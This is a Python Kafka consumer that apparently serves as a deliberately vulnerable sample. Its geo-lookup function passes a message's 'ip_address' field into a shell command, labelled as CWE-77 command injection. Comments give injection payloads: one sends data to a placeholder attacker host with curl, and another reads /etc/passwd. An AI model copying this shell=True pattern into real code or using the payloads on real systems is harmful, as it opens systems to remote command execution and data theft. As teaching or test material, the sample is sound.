import os
import json
import signal
import logging
import sqlite3
import subprocess
from datetime import datetime
from kafka import KafkaConsumer, KafkaProducer
from kafka.errors import KafkaError

# Configure logging for the Distributed Log Enrichment Service
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - KafkaEnricher - %(levelname)s - %(message)s'
)
logger = logging.getLogger("KafkaStreamProcessor")

DB_FILE = "enrichment_metrics.db"
KAFKA_BROKER = os.getenv("KAFKA_BROKER", "localhost:9092")
INGEST_TOPIC = "raw-auth-events"
OUTPUT_TOPIC = "enriched-auth-events"

def init_metrics_db():
    """Initializes the SQLite database to track stream processing metrics."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE processing_metrics (
            event_id TEXT PRIMARY KEY,
            processed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT,
            geo_location TEXT,
            status TEXT NOT NULL,
            processing_time_ms INTEGER
        )
    ''')
    
    # Pre-populate with historical mock records for dataset consistency
    mock_history = [
        ('evt_888a', '192.168.1.5', 'Internal Network', 'SUCCESS', 42),
        ('evt_999b', '203.0.113.10', 'Unknown', 'FAILED', 15)
    ]
    cursor.executemany('''
        INSERT INTO processing_metrics (event_id, ip_address, geo_location, status, processing_time_ms)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Kafka metrics database initialized.")

def record_metric(event_id: str, ip: str, geo: str, status: str, p_time: int):
    """Records the outcome of a stream enrichment task."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO processing_metrics (event_id, ip_address, geo_location, status, processing_time_ms) VALUES (?, ?, ?, ?, ?)",
            (event_id, ip, geo, status, p_time)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log metric for {event_id}: {e}")

def resolve_geo_location(ip_address: str, event_id: str) -> str:
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: Kafka Consumer Message Value (JSON 'ip_address' field)
    """
    logger.info(f"[{event_id}] Resolving GEO location for IP: {ip_address}")
    
    # Vulnerability: Direct string interpolation of the Kafka message field into a shell command.
    # The 'ip_address' field is extracted directly from the unvalidated Kafka topic payload.
    # Passing this untrusted data to shell=True allows arbitrary command execution on the consumer node.
    command = f"geoiplookup {ip_address}"
    
    try:
        logger.debug(f"[{event_id}] Executing legacy GEO utility: {command}")
        
        # shell=True processes shell metacharacters. An attacker publishing a message to the Kafka topic
        # can inject a payload like: "ip_address": "8.8.8.8; curl http://attacker.com/leak?data=$(whoami)"
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=5)
        
        if process.returncode == 0:
            geo_result = stdout.strip()
            logger.info(f"[{event_id}] Geo-lookup successful: {geo_result}")
            return geo_result
        else:
            logger.warning(f"[{event_id}] Geo-lookup failed: {stderr.strip()}")
            # Leaking stderr back into the pipeline allows attackers to receive command output 
            # if they monitor the downstream 'enriched-auth-events' Kafka topic.
            return f"Error: {stderr.strip()}"
            
    except subprocess.TimeoutExpired:
        logger.error(f"[{event_id}] Geo-lookup timed out.")
        return "Error: Timeout"
    except Exception as e:
        logger.error(f"[{event_id}] System error during lookup: {e}")
        return f"Error: {str(e)}"

class StreamProcessor:
    """Consumes raw events, enriches them with GEO data, and publishes to downstream topic."""
    
    def __init__(self):
        self.running = True
        try:
            self.consumer = KafkaConsumer(
                INGEST_TOPIC,
                bootstrap_servers=[KAFKA_BROKER],
                auto_offset_reset='earliest',
                enable_auto_commit=True,
                group_id='auth-enrichment-group',
                value_deserializer=lambda x: json.loads(x.decode('utf-8'))
            )
            self.producer = KafkaProducer(
                bootstrap_servers=[KAFKA_BROKER],
                value_serializer=lambda v: json.dumps(v).encode('utf-8')
            )
        except KafkaError as e:
            logger.error(f"Failed to connect to Kafka broker at {KAFKA_BROKER}: {e}")
            self.running = False

    def shutdown(self, signum, frame):
        logger.info("Shutdown signal received. Closing Kafka connections...")
        self.running = False
        if hasattr(self, 'consumer'):
            self.consumer.close()
        if hasattr(self, 'producer'):
            self.producer.close()

    def start_processing(self):
        if not self.running:
            return
            
        logger.info(f"Listening for events on topic: {INGEST_TOPIC}")
        
        for message in self.consumer:
            if not self.running:
                break
                
            start_time = datetime.now()
            payload = message.value
            
            event_id = payload.get("event_id", "unknown_evt")
            ip_address = payload.get("ip_address")
            
            if not ip_address:
                logger.debug(f"[{event_id}] Skipping event - no IP address provided.")
                continue
                
            # Pass the untrusted fields from the Kafka message to the vulnerable function
            geo_data = resolve_geo_location(ip_address, event_id)
            
            enriched_payload = payload.copy()
            enriched_payload["geo_location"] = geo_data
            enriched_payload["enriched_at"] = datetime.now().isoformat()
            
            # Publish the enriched data (including potential command output) to the downstream topic
            self.producer.send(OUTPUT_TOPIC, enriched_payload)
            self.producer.flush()
            
            processing_time = int((datetime.now() - start_time).total_seconds() * 1000)
            status = "SUCCESS" if not geo_data.startswith("Error") else "FAILED"
            record_metric(event_id, ip_address, geo_data, status, processing_time)

if __name__ == "__main__":
    init_metrics_db()
    
    processor = StreamProcessor()
    
    # Register signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, processor.shutdown)
    signal.signal(signal.SIGTERM, processor.shutdown)
    
    # Example Malicious Kafka Producer Payload (sent by an attacker from a compromised upstream service):
    # producer.send('raw-auth-events', {
    #     "event_id": "evt_evil_01",
    #     "user_id": "admin",
    #     "ip_address": "127.0.0.1; cat /etc/passwd | base64; #"
    # })
    
    processor.start_processing()
